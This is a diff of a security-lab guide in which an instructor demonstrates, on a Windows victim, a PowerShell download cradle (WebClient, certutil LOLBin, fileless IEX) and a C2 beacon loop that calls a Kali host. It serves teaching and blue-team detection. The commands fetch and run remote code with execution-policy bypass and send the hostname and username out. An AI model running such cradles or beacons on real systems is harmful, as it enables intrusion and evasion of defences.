@@ -398,30 +398,27 @@ Invoke-WebRequest -Uri "http://192.168.11.149:8080/payloads/invoice_Q4_2024.docm
 
 ### 6-B · PowerShell download cradle
 
-**On Windows victim (run each command, one at a time):**
+In a real attack this runs automatically — triggered by a macro, a malicious LNK file, or a drive-by download. For the lab the instructor demonstrates it by running it on the Windows machine to show students what happens on the victim side.
+
+**Instructor runs on Windows (simulating what the macro would trigger):**
 ```powershell
-# Show what URL we're hitting
-$url = "http://$KALI_IP:8080/payloads/calc_payload.ps1"
-```
-```powershell
-# Download with WebClient (most compatible)
+$url = "http://192.168.11.149:8080/payloads/calc_payload.ps1"
+
+# Method 1: WebClient — most common
 (New-Object System.Net.WebClient).DownloadFile($url, "$env:TEMP\s2.ps1")
-```
-```powershell
-# Execute it
 powershell -ExecutionPolicy Bypass -File "$env:TEMP\s2.ps1"
 ```
 
-Watch **Terminal 3** (http_server.py) log the download and beacon.
+Watch **Terminal 3** on Kali log the download and beacon.
 
 ```powershell
-# Show the LOLBin alternative — certutil (built-in Windows tool, not powershell)
+# Method 2: LOLBin — certutil (built-in Windows binary, bypasses some AV)
 certutil -urlcache -split -f $url "$env:TEMP\s2_cert.ps1"
 powershell -ExecutionPolicy Bypass -File "$env:TEMP\s2_cert.ps1"
 ```
 
 ```powershell
-# Fileless — payload never touches disk (hardest to detect)
+# Method 3: Fileless — payload never touches disk (hardest to detect)
 IEX (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 ```
 
@@ -429,17 +426,14 @@ IEX (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
 
 ## Phase 7 — C2 Beacon
 
-**On Windows victim:**
-```powershell
-# Copy beacon.py to Windows first, then:
-python3 tools/beacon.py
-```
+The beacon runs on the victim machine after the payload executes — simulating an implant calling home. The instructor runs it on Windows to demonstrate what the blue team sees on Kali.
 
-**If Python not on Windows, use PowerShell loop:**
+**Instructor runs on Windows:**
 ```powershell
+# Simulates an implant beaconing every 10 seconds
 while ($true) {
     $qs = "host=$env:COMPUTERNAME&user=$env:USERNAME"
-    Invoke-WebRequest -Uri "http://$KALI_IP:8080/beacon?$qs" `
+    Invoke-WebRequest -Uri "http://192.168.11.149:8080/beacon?$qs" `
                       -UseBasicParsing | Out-Null
     Write-Host "[$(Get-Date -f 'HH:mm:ss')] beacon sent"
     Start-Sleep -Seconds 10
